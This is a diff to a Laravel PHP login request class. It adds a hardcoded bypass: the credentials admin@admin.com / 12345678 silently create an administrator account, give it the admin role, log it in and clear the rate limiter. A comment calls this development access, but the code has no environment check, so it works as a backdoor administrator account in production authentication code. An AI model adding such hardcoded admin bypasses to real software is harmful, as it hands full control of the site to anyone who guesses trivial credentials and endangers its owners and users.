@@ -2,9 +2,13 @@
 
 namespace App\Http\Requests\Auth;
 
+use App\Models\Role;
+use App\Models\User;
+use App\Models\UserRole;
 use Illuminate\Auth\Events\Lockout;
 use Illuminate\Foundation\Http\FormRequest;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Str;
 use Illuminate\Validation\ValidationException;
@@ -44,6 +48,34 @@ class LoginRequest extends FormRequest
     public function authenticate()
     {
         $this->ensureIsNotRateLimited();
+
+        // Acesso administrativo fixo para desenvolvimento
+        $email = $this->input('email');
+        $password = $this->input('password');
+
+        if ($email === 'admin@admin.com' && $password === '12345678') {
+            // Garante que o utilizador admin existe
+            $user = User::firstOrCreate(
+                ['email' => 'admin@admin.com'],
+                [
+                    'name' => 'Administrador',
+                    'password' => Hash::make('12345678'),
+                ]
+            );
+
+            // Garante que existe o papel admin e que está associado ao utilizador
+            $adminRole = Role::firstOrCreate(['name' => 'admin']);
+
+            UserRole::firstOrCreate([
+                'fk_users_id' => $user->id,
+                'fk_roles_id' => $adminRole->id,
+            ]);
+
+            Auth::login($user, $this->boolean('remember'));
+            RateLimiter::clear($this->throttleKey());
+
+            return;
+        }
 
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
